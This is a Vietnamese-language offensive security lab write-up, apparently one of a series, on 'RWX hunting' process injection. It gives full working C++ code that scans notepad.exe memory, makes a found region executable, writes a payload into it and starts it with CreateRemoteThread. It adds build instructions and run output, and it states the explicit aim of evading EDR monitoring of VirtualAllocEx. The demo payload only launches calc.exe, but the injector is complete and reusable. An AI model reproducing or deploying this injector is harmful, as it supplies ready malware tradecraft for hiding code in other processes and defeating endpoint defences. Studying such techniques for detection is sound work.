
---

# 📝 [PE 13] RWX Hunting and Injection (Adaptive Context Restoration V2)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**RWX Hunting and Injection** là giải thuật né tránh phòng thủ động (Dynamic Evasion) mang đậm triết lý ký sinh.

Hành vi sử dụng hàm `VirtualAllocEx` để tạo mới một trang bộ nhớ ảo luôn nằm trong tầm ngắm trinh sát nghiêm ngặt của các bộ quét hành vi động EDR. Lab PE 13 hóa giải bài toán này bằng cách **không xin cấp phát thêm bất kỳ phân vùng thực thi mới nào**, mà sử dụng lệnh `VirtualQueryEx` để quét toàn bộ bản đồ bộ nhớ ảo của tiến trình mục tiêu (ví dụ: `notepad.exe`) nhằm săn lùng một hốc trống có sẵn.

Đặc biệt, phiên bản nâng cấp V2 áp dụng giải thuật **Săn phân vùng Private rảnh (PAGE_READWRITE)** kết hợp cơ chế gài hàm đóng luồng an toàn bằng địa chỉ tuyệt đối để hóa giải lỗi sập Stack Frame, bảo đảm tiến trình cha sống sót và hoạt động mượt mà song song với Payload.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa bộ lọc hành vi quét lệnh gọi tạo trang nhớ `VirtualAllocEx` của giải pháp an ninh.
* Làm chủ giải thuật duyệt cấu trúc trang nhớ hệ thống qua hàm Native `VirtualQueryEx`.
* Khắc phục lỗi sập RAM tiến trình mục tiêu thông qua cơ chế giải thoát luồng tuyệt đối `ExitThread`.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Hệ điều hành Windows quản lý không gian ảo của tiến trình thông qua các cấu trúc phân vùng bộ nhớ được mô tả bởi bảng `MEMORY_BASIC_INFORMATION` (MBI).

Quy trình toán học giải phẫu bản đồ RAM và ký sinh mã máy của Lab PE 13 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[VirtualQueryEx: Quét cấu trúc trang] ──> [Săn hốc Private RW rảnh] ──> [VirtualProtectEx: Mở quyền] ──> [WriteProcessMemory: Ký sinh] ──> [ExitThread: Đóng luồng mượt]

```

1. **Trinh sát cấu trúc trang nhớ (`VirtualQueryEx`)**: Loader tịnh tiến con trỏ địa chỉ ảo liên tục để bốc tách thông số trạng thái của từng phân vùng. Trình duyệt tìm kiếm sẽ bỏ qua các vùng nhớ hệ thống quá thấp và săn tìm các phân vùng mang trạng thái `MEM_COMMIT`, loại `MEM_PRIVATE` và cờ bảo vệ `PAGE_READWRITE` (vùng Heap/Stack rảnh đang chứa toàn byte `0x00`). Việc chọn vùng rảnh này giúp ta ghi đè mã máy lên mà không phá hỏng dữ liệu đang chạy của đối phương.
2. **Lật cờ thích ứng (`VirtualProtectEx`)**: Do phân vùng săn được ban đầu chỉ có quyền ghi dữ liệu (`RW`), Loader gọi hàm lật cờ bảo vệ sang **`PAGE_EXECUTE_READWRITE` (RWX)** để chuẩn bị kích nổ CPU.
3. **Cô lập và bảo toàn tháp luồng (`ExitThread`)**: Nếu Payload kết thúc bằng lệnh `return`, CPU tiến trình đích sẽ lấy một địa chỉ trả về rác từ Stack Frame bị vá, kích nổ ngoại lệ `Access Violation (0xC0000005)` làm sập Notepad ngay lập tức. Để hóa giải, Loader truyền địa chỉ RAM tuyệt đối của hàm **`ExitThread`** sang. Khi Payload chạy xong chức năng, nó gọi thẳng đến `ExitThread` để tự giải thoát luồng ký sinh một cách êm đẹp.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thông số trang bộ nhớ thực tế để đạt độ ẩn mình kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
typedef VOID(WINAPI* fnExitThread)(DWORD dwExitCode);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    fnExitThread pExitThread; // BẢO VỆ: Địa chỉ tuyệt đối của ExitThread để đóng luồng êm đẹp
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ được ký sinh vào RAM đối phương
DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    
    // GIẢI PHÁP ĐỘT PHÁ V2: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của tiến trình cha
    if (pData && pData->pExitThread) {
        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ
    }

    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn
PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& needsProtectToggle) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = 0;
    PVOID fallbackAddress = NULL;

    needsProtectToggle = FALSE;

    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên x64
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {

        // CHIẾN THUẬT LÝ TƯỞNG: Săn phân vùng COMMIT có sẵn thuộc tính PAGE_EXECUTE_READWRITE (RWX)
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= requiredSize) {
            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                return mbi.BaseAddress;
            }
        }

        // KỊCH BẢN DỰ PHÒNG CHỦ ĐỘNG: Săn các phân vùng Private Heap/Stack mang quyền RW rảnh (PAGE_READWRITE)
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize >= requiredSize && fallbackAddress == NULL) {
            
            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                fallbackAddress = mbi.BaseAddress;
            }
        }

        address = (LPVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    if (fallbackAddress != NULL) {
        std::cout << "[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x" << fallbackAddress << std::endl;
        needsProtectToggle = TRUE;
        return fallbackAddress;
    }

    return NULL;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE V2" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc nhen." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    SIZE_T functionSize = 500;
    BOOL needsProtectToggle = FALSE;

    // Bước 1: Thực hiện chiến dịch săn lùng vùng nhớ thích ứng
    PVOID rwxTargetAddress = HuntForAdaptiveMemoryRegion(hProcess, functionSize, needsProtectToggle);

    if (rwxTargetAddress == NULL) {
        std::cerr << "[-] Khong tim thay phan vung nho hop le de ky sinh!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Bước 2: Cấp phát riêng ô nhỏ chứa tham số dữ liệu tuyệt đối từ xa
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
        localData.pExitThread = (fnExitThread)GetProcAddress(hKernel32, "ExitThread");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy dữ liệu cấu trúc tham số tuyệt đối sang RAM Notepad trước
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    DWORD oldProtect = 0;
    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    }

    // Bước 3: KÝ SINH - Ghi đè trực tiếp khối mã máy của ta đè bẹp dữ liệu cũ của phân vùng săn được
    WriteProcessMemory(hProcess, rwxTargetAddress, (LPCVOID)RemoteParasitePayload, functionSize, NULL);
    std::cout << "[+] Nap ma may vao phan vung ky sinh hoan tot." << std::endl;

    // Bước 4: Kích nổ luồng thực thi từ xa ngay trên tọa độ ký sinh bộ nhớ
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxTargetAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Chờ 1 giây đồng bộ ngắn để WinExec kịp nổ tung
        std::cout << "[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!" << std::endl;
        CloseHandle(hThread);
    }

    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
        std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung." << std::endl;
    }

    // Giải phóng ô chứa dữ liệu và đóng handle bảo an kịch trần
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] RWX Hunting Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh thư viện hệ thống chạy mượt mà trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản file `.exe` độc lập hoàn hảo.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE13_RWX_Hunting_Injection.exe
====================================================
[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 14520
[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x000000839E3C9000
[+] Nap ma may vao phan vung ky sinh hoan tot.
[*] Dang khoi tao luong CreateRemoteThread tu xa...
[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!
[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung.

[+] RWX Hunting Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

*🎯 Hệ quả RAM:* Dò trúng hốc trống bộ nhớ rảnh đang sống của đối phương, gài Payload cấu trúc tuyệt đối vào ký sinh, mở Máy tính `calc.exe` bật bung hiên ngang tại chỗ mà tiến trình Notepad hoàn toàn bình an vô sự!

---

